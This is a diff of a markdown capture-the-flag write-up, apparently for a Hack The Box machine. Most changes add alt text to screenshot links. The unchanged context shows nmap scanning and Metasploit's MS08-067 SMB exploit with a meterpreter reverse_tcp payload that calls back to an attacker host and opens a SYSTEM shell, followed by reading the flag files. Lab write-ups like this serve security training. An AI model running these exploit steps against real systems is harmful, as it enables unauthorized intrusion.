@@ -34,7 +34,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.10.4
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -77,13 +77,7 @@ nmap -p135,139,445 -sC -sV 10.10.10.4 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
-
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -111,11 +105,11 @@ msfconsole
 search ms08_067
 ```
 
-![](screenshots/msfconsole_ms08_067.png)
+![msfconsole_ms08_067](screenshots/msfconsole_ms08_067.png)
 
 Configure and run the exploit:
 
-``` bash
+```bash
 use exploit/windows/smb/ms08_067_netapi
 set rhosts 10.10.10.4
 set lhost 10.10.14.8
@@ -124,7 +118,7 @@ set payload windows/meterpreter/reverse_tcp
 exploit
 ```
 
-![](screenshots/exploit_run.png)
+![exploit_run](screenshots/exploit_run.png)
 
 ✅ We obtain a shell with SYSTEM privileges.
 
@@ -139,7 +133,7 @@ The user flag is saved in `john` user inside the `Documents and Settings`directo
 type C:\Documents and Settings\john\Desktop\user.txt
 ```
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -152,7 +146,7 @@ We are root, so we can go to `Administrator` directory for the root flag:
 type C:\Documents and Settings\Administrator\Desktop\root.txt
 ```
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ✅ **Root flag obtained**
 
